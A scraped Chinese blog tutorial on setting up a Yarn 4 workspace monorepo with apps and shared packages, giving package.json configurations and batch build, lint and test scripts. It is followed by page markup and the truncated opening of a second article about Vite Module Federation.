<table><thead><tr><th>特性/方面</th><th>Monorepo（单体仓库）</th><th>Multi-repo（多仓库）</th></tr></thead><tbody><tr><td><strong>代码组织</strong></td><td>所有项目代码在一个仓库中</td><td>每个项目独立仓库</td></tr><tr><td><strong>代码共享</strong></td><td>直接通过引用共享代码，无需发布包</td><td>需要将共享代码发布为npm包才能复用</td></tr><tr><td><strong>依赖管理</strong></td><td>统一依赖版本，避免版本冲突</td><td>各仓库可能使用不同版本的依赖，易出现冲突</td></tr><tr><td><strong>代码变更</strong></td><td>跨项目变更可在一次提交中完成</td><td>需要在多个仓库中进行多次提交和协调</td></tr><tr><td><strong>构建测试</strong></td><td>可统一构建、测试所有项目</td><td>需要单独构建、测试每个仓库</td></tr><tr><td><strong>存储效率</strong></td><td>依赖只安装一次，节省空间</td><td>相同依赖在各仓库中重复安装</td></tr><tr><td><strong>权限管理</strong></td><td>较难实现细粒度的权限控制</td><td>可针对不同仓库设置不同权限</td></tr><tr><td><strong>初始复杂度</strong></td><td>配置相对复杂，需要专用工具支持</td><td>配置简单，容易上手</td></tr></tbody></table>
<h3 data-id="heading-3">1.3 适用场景</h3>
<p>Monorepo 特别适合以下场景：</p>
<ul>
<li><strong>微服务架构</strong>：多个服务紧密相关，经常需要协同开发和部署</li>
<li><strong>组件库开发</strong>：共享UI组件、工具函数等公共资源</li>
<li><strong>前端应用与后端服务的联合开发</strong>：需要频繁跨项目协作</li>
<li><strong>大型团队协作</strong>：代码共享需求高，需要统一的工作流和规范</li>
<li><strong>需要频繁同步更新的多项目</strong>：相关项目之间存在紧密依赖关系</li>
</ul>
<h3 data-id="heading-4">1.4 常见误区</h3>
<p>需要注意的是，Monorepo 并非适用于所有场景：</p>
<ul>
<li>它不意味着所有代码都必须放在一个文件中，仍然保持良好的模块化结构</li>
<li>它不消除代码隔离的需要，相反，Monorepo 更强调合理的项目边界划分</li>
<li>它不是解决所有协作问题的银弹，仍需良好的开发规范和流程配合</li>
<li>对于完全独立、技术栈差异大、几乎不需要代码共享的项目，多仓库模式可能更合适</li>
</ul>
<h2 data-id="heading-5">二、Monorepo 核心目标</h2>
<p>在动手前，先明确 Monorepo 的核心目标，避免走偏。其核心是“公共代码抽离、业务项目隔离”，具体目标包括：</p>
<ul>
<li><strong>统一管理</strong>：代码、依赖、构建、测试、部署流程统一维护；</li>
<li><strong>共享复用</strong>：公共代码（如工具函数、组件、配置）抽为公共包，避免重复开发；</li>
<li><strong>隔离清晰</strong>：各项目/模块独立编译、测试、发布，互不干扰；</li>
<li><strong>高效协作</strong>：跨项目开发无需切换仓库，分支管理、代码审查更简化；</li>
<li><strong>版本一致</strong>：避免多仓库间依赖版本冲突，确保所有项目使用统一的依赖版本。</li>
</ul>
<h2 data-id="heading-6">三、技术栈选择</h2>
<p>在众多 Monorepo 解决方案中，本次选用的技术栈及核心理由如下：</p>

























<table><thead><tr><th>技术组件</th><th>版本/作用</th><th>选择理由</th></tr></thead><tbody><tr><td>核心包管理器</td><td>Yarn 4.9.1（Workspace 特性）</td><td>1. Workspace 功能成熟稳定；2. 依赖提升机制（hoisting）减少重复依赖；3. 支持 node-modules 模式；4. 丰富的命令行工具适配 Monorepo 操作</td></tr><tr><td>代码规范</td><td>EditorConfig</td><td>统一多编辑器代码格式配置，保证团队编码风格一致</td></tr><tr><td>任务调度</td><td>concurrently</td><td>支持并行执行多个命令，提升开发和构建效率</td></tr></tbody></table>
<h2 data-id="heading-7">四、项目目录结构设计</h2>
<p>合理的目录结构是 Monorepo 成功的关键，本次采用经典的分层结构，清晰区分业务应用与公共资源，具体结构如下：</p>
<pre><code class="hljs language-csharp" lang="csharp">LowCode/
├── package.json                <span class="hljs-meta"># 根项目配置（管理公共依赖、脚本命令）</span>
├── tsconfig.<span class="hljs-keyword">base</span>.json          <span class="hljs-meta"># TypeScript 基础配置（共享给所有子项目）</span>
├── .yarn/                      <span class="hljs-meta"># Yarn 配置</span>
├── .yarnrc.yml                 <span class="hljs-meta"># Yarn 运行时配置</span>
├── 其他配置...
├── apps/                       <span class="hljs-meta"># 业务项目目录（独立部署的应用）</span>
│   ├── web/                    <span class="hljs-meta"># 前端 Web 应用</span>
│   │   └── package.json
│   ├── api/                    <span class="hljs-meta"># 后端 API 服务</span>
│   │   └── package.json
├── packages/                   <span class="hljs-meta"># 公共包目录（可被其他项目依赖）</span>
│   ├── utils/                  <span class="hljs-meta"># 工具函数库</span>
│   │   └── package.json
│   ├── components/             <span class="hljs-meta"># UI 组件库</span>
│   │   └── package.json
│   └── config/                 <span class="hljs-meta"># 共享配置库</span>
│   │   └── package.json
</code></pre>
<p><strong>核心目录说明</strong>：</p>
<ul>
<li><strong>apps/</strong> ：存放业务应用，每个应用都是独立可部署的项目，如前端 Web 应用和后端 API 服务；</li>
<li><strong>packages/</strong> ：存放可重用的公共库，供 apps 目录下的项目依赖使用，包括工具函数、UI 组件和共享配置等；</li>
<li><strong>根目录</strong>：承担全局管理职责，包含项目级公共配置、共享脚本、依赖声明和项目文档。</li>
</ul>
<h2 data-id="heading-8">五、实现步骤详解</h2>
<p>Monorepo 的实现遵循“初始化-配置-细化”的流程，从根项目搭建到子项目配置逐步推进，确保每个环节衔接顺畅。</p>
<h3 data-id="heading-9">1. 初始化根项目</h3>
<p>首先创建项目根目录并通过 Yarn 初始化，生成基础的 package.json 文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> LowCode
<span class="hljs-built_in">cd</span> LowCode
yarn init -y
</code></pre>
<h3 data-id="heading-10">2. 配置 Yarn Workspace</h3>
<p>Yarn Workspace 是实现 Monorepo 依赖管理和项目关联的核心，需在根项目的 package.json 中添加如下配置，明确工作空间范围和公共脚本：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"low_code"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"packageManager"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn@4.9.1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"packages/*"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// 所有在 packages 目录下的子项目</span>
    <span class="hljs-string">"apps/*"</span>         <span class="hljs-comment">// 所有在 apps 目录下的子项目</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A run test"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:all"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:apps"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A --include 'apps/*' -p run build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build:packages"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A --include 'packages/*' -p run build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev:web"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace @wect/web dev"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev:api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace @wect/api dev"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev:all"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"concurrently "</span>yarn workspace @wect/web dev<span class="hljs-string">" "</span>yarn workspace @wect/api dev<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"clean"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run clean"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"add"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"remove"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspace"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run lint"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint:fix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn workspaces foreach -A -p run lint:fix"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --write './**/*.{js,jsx,ts,tsx,json,md,yml}' --ignore-path .prettierignore"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"format:check"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --check './**/*.{js,jsx,ts,tsx,json,md,yml}' --ignore-path .prettierignore"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"concurrently"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^9.2.1"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>配置关键点</strong>：</p>
<ul>
<li><code>private: true</code> 确保根项目不会被意外发布；</li>
<li><code>workspaces</code> 数组定义工作空间位置，自动识别指定目录下的子项目；</li>
<li>通过 <code>workspace</code> 命令操作单个子项目，<code>workspaces foreach</code> 批量操作所有子项目；</li>
<li>子项目名称统一使用作用域前缀（如 <code>@wect/web</code>），避免命名冲突。</li>
</ul>
<h3 data-id="heading-11">3. 配置 Yarn 运行时</h3>
<p>创建 <code>.yarnrc.yml</code> 文件，指定 Yarn 的依赖链接模式，本次采用经典的 node-modules 模式，兼容性更强：</p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-comment"># Yarn配置文件</span>
<span class="hljs-attr">nodeLinker:</span> <span class="hljs-string">node-modules</span>
</code></pre>
<h3 data-id="heading-12">4. 初始化子项目</h3>
<p>子项目初始化提供两种方式，可根据实际需求选择：</p>
<h4 data-id="heading-13">方法一：批量初始化（推荐）</h4>
<p>先安装任务调度依赖 concurrently，再通过 Yarn 命令批量初始化所有子项目：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装公共开发依赖</span>
yarn add -D concurrently

<span class="hljs-comment"># 批量初始化所有子项目</span>
yarn workspaces foreach -A -p init
</code></pre>
<h4 data-id="heading-14">方法二：手动初始化（适用于个别项目）</h4>
<p>进入具体子项目目录，单独执行初始化命令，以 web 应用为例：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> apps/web
yarn init -y
</code></pre>
<h3 data-id="heading-15">5. 配置子项目</h3>
<p>每个子项目需配置独立的 package.json，明确自身依赖、脚本命令等信息，同时通过 workspace 协议关联内部公共包。以下是核心子项目的配置示例：</p>
<h4 data-id="heading-16">Web 应用配置（apps/web/package.json）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"@wect/web"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"packageManager"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yarn@4.9.1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsc &amp;&amp; vite build"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"preview"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite preview"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo '运行Web测试...'"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"clean"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rm -rf dist"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint 'src/**/*.{js,jsx,ts,tsx}'"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint:fix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint 'src/**/*.{js,jsx,ts,tsx}' --fix"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"prettier --write 'src/**/*' --ignore-path ../../.prettierignore"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@wect/utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// 依赖内部工具包</span>
    <span class="hljs-attr">"@wect/components"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 依赖内部组件库</span>
    <span class="hljs-attr">"@wect/config"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>      <span class="hljs-comment">// 依赖内部配置库</span>
    <span class="hljs-attr">"react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"react-dom"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@types/node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^20.14.10"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@types/react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@types/react-dom"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^19.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@vitejs/plugin-react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.2.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^9.7.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^7.35.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint-plugin-react-hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.6.2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.5.3"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.3.9"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-17">API 服务配置（apps/api/package.json）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"@wect/api"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>启动API开发服务器...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>构建API服务...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>运行API服务测试...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>检查API服务代码...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"clean"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>清理API服务构建产物...<span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deploy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo "</span>部署API服务...<span class="hljs-string">""</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@wect/utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"@wect/config"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-18">6. 依赖管理详解</h3>
<p>Monorepo 中的依赖管理分为“外部依赖”和“内部依赖”，需采用不同的管理方式：</p>
<h4 data-id="heading-19">安装外部依赖</h4>
<p>根据依赖的作用范围，可安装在根项目（所有子项目共享）或特定子项目：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装根项目依赖（所有子项目共享）</span>
yarn add -D prettier eslint

<span class="hljs-comment"># 为 web 应用单独安装依赖</span>
yarn workspace @wect/web add react react-dom
</code></pre>
<h4 data-id="heading-20">依赖内部子项目</h4>
<p>使用 <code>workspace:</code> 协议引用其他工作空间，确保始终使用本地最新版本，避免版本不一致问题：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@wect/utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// * 表示匹配最新版本</span>
    <span class="hljs-attr">"@wect/components"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"workspace:*"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-21">7. 常用脚本命令详解</h3>
<p>根项目的 scripts 配置了批量操作子项目的命令，结合 Yarn Workspace 特性实现高效管理，核心命令及用途如下：</p>

































































<table><thead><tr><th>命令分类</th><th>具体命令</th><th>功能说明</th></tr></thead><tbody><tr><td>开发命令</td><td>yarn dev:web</td><td>单独启动 web 应用开发服务器</td></tr><tr><td>yarn dev:api</td><td>单独启动 API 服务开发服务器</td><td/></tr><tr><td>yarn dev:all</td><td>并行启动 web 和 API 开发服务（依赖 concurrently）</td><td/></tr><tr><td>构建命令</td><td>yarn build:all</td><td>构建所有工作空间（应用+公共包）</td></tr><tr><td>yarn build:apps</td><td>仅构建 apps 目录下的业务应用</td><td/></tr><tr><td>yarn build:packages</td><td>仅构建 packages 目录下的公共包</td><td/></tr><tr><td>质量保障命令</td><td>yarn test</td><td>运行所有子项目的测试用例</td></tr><tr><td>yarn lint / lint:fix</td><td>检查/修复所有子项目的代码规范问题</td><td/></tr><tr><td>yarn format / format:check</td><td>格式化代码/检查代码格式是否合规</td><td/></tr><tr><td>yarn clean</td><td>清理所有子项目的构建产物（dist 目录）</td><td/></tr><tr><td/><td/><td/></tr></tbody></table>
<p><strong>批量命令技巧</strong>：</p>
<ul>
<li><code>-A</code> 参数：操作所有工作空间；</li>
<li><code>-p</code> 参数：并行执行命令，提升效率；</li>
<li><code>--include</code> 参数：过滤目标工作空间，如 <code>--include 'apps/*'</code> 仅操作应用项目。</li>
</ul>
<h2 data-id="heading-22">六、版本一致性保障</h2>
<p>Monorepo 中依赖版本不一致是常见问题，可能导致运行报错或功能异常，需从以下三方面保障版本统一：</p>
<ol>
<li><strong>根级依赖锁定</strong>：将 TypeScript、构建工具、代码规范工具等公共依赖在根项目的 package.json 中明确定义版本，子项目无需重复声明，直接继承根依赖版本；</li>
<li><strong>使用 workspace 协议</strong>：子项目间的依赖必须使用 <code>workspace:*</code> 协议，确保始终引用本地最新版本，避免子项目间依赖版本错位；</li>
<li><strong>统一 TypeScript 配置</strong>：根项目创建 <code>tsconfig.base.json</code> 作为基础配置，子项目通过 <code>"extends": "../../tsconfig.base.json"</code> 继承，保证类型检查规则一致。</li>
</ol>
<h2 data-id="heading-23">七、实际配置总结</h2>
<p>本次 Monorepo 实现的核心配置要点可归纳为以下三点，便于后续维护和扩展：</p>
<ul>
<li><strong>依赖模式</strong>：采用 node-modules 模式，兼容性强，避免 PnP 模式可能出现的工具适配问题；</li>
<li><strong>命名规范</strong>：子项目统一使用 <code>@wect/</code> 作用域前缀，清晰区分项目归属，避免命名冲突；</li>
<li><strong>脚本统一</strong>：所有子项目定义一致的脚本命令（如 build、dev、test），确保批量操作顺畅；</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vite 下使用 Module Federation]]></title>    <link>https://juejin.cn/post/7575090551357571124</link>    <guid>https://juejin.cn/post/7575090551357571124</guid>    <pubDate>2025-11-23T08:31:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357571124" data-draft-id="7575106644499202082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vite 下使用 Module Federation"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:31:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一千柯橘"/> <meta itemprop="url" content="https://juejin.cn/user/2010369939736343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vite 下使用 Module Federation
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2010369939736343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一千柯橘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:31:56.000Z" title="Sun Nov 23 2025 08:31:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAdCAYAAABcz8ldAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAhgSURBVGhD7Zp7bBTHHcdn33t7vvOdzy+ITVKDU0xIKG2ABCPTRCCaUiEVKWoqRJuASAhCitRCVKSoalFUKZBiSmmFRRJKRUnUtIpo+aNqGgwoOCmuFUIRzxjwE4zte+97drYzztji8HPvtkit/PnH+n1397Tz+83vN/PbMZhmmmmm+d+BoX8n5diihcGqgFQf5vk6BMAskWUlw3GyFnIvtqWSf91w7mKC3npfOLX7wYeiIa6BBWCOLLFRF2NB0JvIOP/80YG+k2ev6S699b/OzOfKBW5l5KsgyC4DCFQDnpEAdE1goc/dlNPc/Up7P711UiYNSMuyxeUzZPnHgGHWh5XADEkSAcdiN+AnEXIBhBComgFU0/xQR+jnj51sOUMf9Z0NKyL8S9+JPBEN8zuCMrsqGOA5QWAAyzLAxe53HBeYFgJp1c5Cx33nyIfpV3e+22/Sx32nev/sMCgVnmM4bjOniAtZWQAsz315EfsGQQc4hgWcjHkCmOj1rheuNn95cXwmDMiVp5etC/D8m5FwUWVQUYYGPh6mZYFUOgsGVa1pXvOZzVT2jRuH54RM230jEuI3RcIiL4l4UkxAJmuD/riVsqD7ct2m9nep7BtVTbVfZ0uE/UIk+CQflAHDjf8+Lg6MldYATGpH3c/Ul7p3dWXppVGM6eElJSHmnQWPbSlRlN1lJcUBjqNRnwJZVQO3B5P/uq5rK1d90pakckFcaKp5UJHY92JR8YlwkUDVySEZfGfQdO7E7Z8s2HL9TSoXTPXRud9nA8IBqSwcZgWeqpPj6BYw7yTbXBN9q2v9lQEq5zBmWA8vWLCptCi4tzwW8RQMQlFQATPLSh6vCSh/plJBkMyQBHZfWYnkKRgEktEVpTJXERN2Xzo4ex2VC6K6qXYpF5b3ypVRT8EgcAERSJXRbwCBOTFzXblM5RxGB